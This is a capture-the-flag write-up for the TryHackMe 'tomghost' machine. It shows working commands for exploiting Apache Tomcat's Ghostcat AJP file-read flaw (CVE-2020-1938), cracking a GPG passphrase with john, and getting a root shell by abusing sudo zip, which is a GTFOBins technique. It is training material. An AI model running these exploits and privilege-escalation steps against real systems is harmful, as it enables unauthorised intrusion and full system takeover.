# tomghost

**IP:** 10.10.209.147  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 07/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.209.147 -oA nmap/tomghost
```

| Port | Service    | Version                         |
| ---- | ---------- | ------------------------------- |
| 22   | ssh        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 53   | tcpwrapped |                                 |
| 8009 | ajp13      | Apache Jserv                    |
| 8080 | http       | Apache Tomcat 9.0.30            |

## Enumeration

After some research, I found an LFI vulnerability `CVE-2020-1938` in the current version of the AJP `48143` in `searchsploit`.
```bash
searchsploit ajp
...                                                                       | php/webapps/3752.txt
Apache Tomcat - AJP Ghostcat File Read/Inclusion                             ...

searchsploit -m 48143
  Exploit: Apache Tomcat - AJP Ghostcat File Read/Inclusion
      URL: https://www.exploit-db.com/exploits/48143
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48143.py
    Codes: CVE-2020-1938
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/wither/CTF/THM/tomghost/files/48143.py
```

## Exploitation

This exploit retrieved the `web.xml` file, which revealed some credentials `skyfuck:8730281lkjlkjdqlksalks`.
```bash
python2 48143.py -p 8009 10.10.209.147
Getting resource at ajp13://10.10.209.147:8009/asdf
...
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
...                         
```

I used these to SSH into the machine. THere were two files in the home directory of `skyfuck`, `credential.pgp` and `tryhackme.asc`.
```bash
ssh skyfuck@10.10.209.147

pwd;ls
/home/skyfuck
credential.pgp  tryhackme.asc
```

## Privilege Escalation

I copied the `.asc` file over to my machine and used `gpg2john` to convert it into a crackable hash, which I then passed to `john` to reveal the GPG passphrase.
```bash
scp skyfuck@10.10.209.147:/home/skyfuck/tryhackme.asc .
                                                                              
gpg2john tryhackme.asc > hash 
File tryhackme.asc
                                                                                john hash --wordlist=/usr/share/wordlists/rockyou.txt
                                                                                
...
alexandru        (tryhackme)     
...
```

Decrypting the `.php` file with the passphrase revealed some credentials fora  `merlin` user `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`.
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp 

Enter passphrase: 
...
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

I then logged in as `merlin`, who could run `/usr/bin/zip` as `root` with NOPASSWD. I used this to zip a random file and spawn a privileged shell as `root`.
```bash
su merlin
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

cd ~

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

id
uid=0(root) gid=0(root) groups=0(root)
```

User flag was in `/home/merlin/user.txt`.
```
cat /home/merlin/user.txt
```

`root` flag was in `/root/root.txt`.
```
cat /root/root.txt
```

## References
- [8009 - Pentesting Apache JServ Protocol (AJP) \| HackTricks - Boitatech](https://hacktricks.boitatech.com.br/pentesting/8009-pentesting-apache-jserv-protocol-ajp)
- [Busting Ghostcat: Analysis of CVE-2020-1938 \| Trend Micro (UK)](https://www.trendmicro.com/en_gb/research/20/c/busting-ghostcat-an-analysis-of-the-apache-tomcat-vulnerability-cve-2020-1938-and-cnvd-2020-10487.html)
- [Just a moment...](https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key)
- [zip \| GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo)

---
#nmap #searchsploit #ghostcat #ajp-exploit #gpg2john #john #sudo-zip #gtfobins #tomcat #cve-2020-1938 #linux-privesc #thm